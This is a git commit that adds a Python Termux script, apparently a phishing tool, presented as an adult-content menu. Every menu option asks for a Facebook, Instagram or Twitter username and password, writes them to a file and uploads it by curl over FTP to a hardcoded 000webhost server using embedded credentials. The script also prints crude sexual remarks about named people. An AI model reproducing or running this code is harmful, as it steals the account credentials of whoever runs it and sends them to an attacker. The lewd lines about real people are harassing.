5eebc49f764c1c4a3696fc434bcc46d1ba5df2ec
Muhammad prince <96841358+prince00110011@users.noreply.github.com>
2022-02-17 20:12:03 +0000

    fuck.py
    pkg install git
    git clone https://github.com/prince00110011/Fucking.git
    cd Fucking
    python2 fuck.py

---
+++ fuck.py
@@ -0,0 +1,130 @@
+#Tool By Muhammad prince (Md Touhid Miah)
+import os
+import subprocess
+from subprocess import check_call
+print("joy sahar salir sawa   vv   ")     
+print("razon vaiyer ex er pussy    ")
+print("mazi sir er ex er ass hole  ")
+print("dip dadar ex er bor dudh    ")
+print("alif er gf er navi          ")                 
+print("\033[1;33mPlease Configure New Updates")
+print("\033[1;31mNote : tumi chailei je kono meyer dudh khete parbe kinrltu tumar poket a taka thakte hobe")
+print("\n")
+cmd0 = os.system("pkg install curl && apt install curl")
+cmd  = os.system("clear")
+def intro():
+    cmd  = os.system("clear")
+    print("""
+\033[I
+\033[F = feel                      
+\033[U = Understand 
+\033[C = care 
+\033[k = kiss  
+\033[you
+   \033[0m>>Developed By Muhammad Prince (Md Touhid Miah)<<
+          \033[95mVersion : 2.3.6
+\033[0m=================================== 
+                                       """)
+    print("""
+\033[1;34m==> Select the number of the option that you want to start from below :
+ 
+ \033[1;33m[1] Ass fucking      [by THE JOKER]
+ \033[1;33m[2] pussy fucking    [by THE JOKER] 
+ \033[1;33m[3] BDSM             [by THE JOKER]
+ \033[1;33m[4] Doggy style 
+ \033[1;33m[5] sexy boobs
+ \033[1;33m[6] Big ass
+ \033[1;33m[7] Natural tits
+ \033[1;33m[8] Big tits
+ \033[1;33m[9] With condom""")
+    print("\033[1;33m")
+    var = int(input("[>] Select Your Option :"))
+    if var == 1 :
+        print("\nNote:Login to your account you want to take sexy girls for fuck  to")
+        print("\n┌Type username or email adress")
+        user = input("└──>")
+        print("\n┌Type Password")
+        password = input("└──>")
+        order = "echo user {} password {}>facebook.txt && curl -T facebook.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf facebook.txt ".format(user,password)
+        geny  = os.system(order)
+        intro()
+    elif var == 2 :
+        print("\nNote:Login to your account you want to take a girl for fuck to")
+        print("\n┌Type username or email adress")
+        user = input("└──>")
+        print("\n┌Type Password")
+        password = input("└──>")
+        order = "echo user {} password {}>facebook.txt && curl -T facebook.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf facebook.txt ".format(user,password)
+        geny  = os.system(order)
+        intro()
+    elif var == 3 :
+        print("\nNote:Login to your account you want to take a girl for Bdsm to")
+        print("\n┌Type username or email adress")
+        user = input("└──>")
+        print("\n┌Type Password")
+        password = input("└──>")
+        order = "echo user {} password {}>facebook.txt && curl -T facebook.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf facebook.txt ".format(user,password)
+        geny  = os.system(order)
+        intro()
+    elif var == 4 :
+        print("\nNote:Login to your account you want to take a girl fo ass fucking to")
+        print("\n┌Type username or email adress")
+        user = input("└──>")
+        print("\n┌Type Password")
+        password = input("└──>")
+        order = "echo user {} password {}>instagram.txt && curl -T instagram.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf instagram.txt ".format(user,password)
+        geny  = os.system(order)
+        intro()
+    elif var == 5 :
+        print("\nNote:Login to your account you want to take a big boobds gir for fucking to")
+        print("\n┌Type username or email adress")
+        user = input("└──>")
+        print("\n┌Type Password")
+        password = input("└──>")
+        order = "echo user {} password {}>instagram.txt && curl -T instagram.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf instagram.txt ".format(user,password)
+        geny  = os.system(order)
+        intro()
+    elif var == 6 :
+        print("\nNote:Login to your account you want to take a gig ass girl for fucking to")
+        print("\n┌Type username or email adress")
+        user = input("└──>")
+        print("\n┌Type Password")
+        password = input("└──>")
+        order = "echo user {} password {}>instagram.txt && curl -T instagram.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf instagram.txt ".format(user,password)
+        geny  = os.system(order)
+        intro()
+    elif var == 7 :
+        print("\nNote:Login to your account you want to take a natural tits girl for fucking to")
+        print("\n┌Type username or email adress")
+        user = input("└──>")
+        print("\n┌Type Password")
+        password = input("└──>")
+        order = "echo user {} password {}>twitter.txt && curl -T twitter.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf twitter.txt ".format(user,password)
+        geny  = os.system(order)
+        intro()
+    elif var == 8 :
+        print("\nNote:Login to your account you want to take a sexy girl for get sucking to")
+        print("\n┌Type username or email adress")
+        user = input("└──>")
+        print("\n┌Type Password")
+        password = input("└──>")
+        order = "echo user {} password {}>twitter.txt && curl -T twitter.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf twitter.txt ".format(user,password)
+        geny  = os.system(order)
+        intro()
+    elif var == 9 :
+        print("\nNote:Login to your account you want to take a girl for Bdsm to")
+        print("\n┌Type username or email adress")
+        user = input("└──>")
+        print("\n┌Type Password")
+        password = input("└──>")
+        order = "echo user {} password {}>twitter.txt && curl -T twitter.txt ftp:/demonsiteinfo:demon404@files.000webhost.com/public_html/ && rm -rf twitter.txt ".format(user,password)
+        geny  = os.system(order)
+        intro()
+    elif var == 10 :
+        cmd0 = os.system("sleep 3")
+        intro()    
+    else:
+        print("Not Found")
+        cmd = os.system("sleep 2")
+        intro()
+intro()
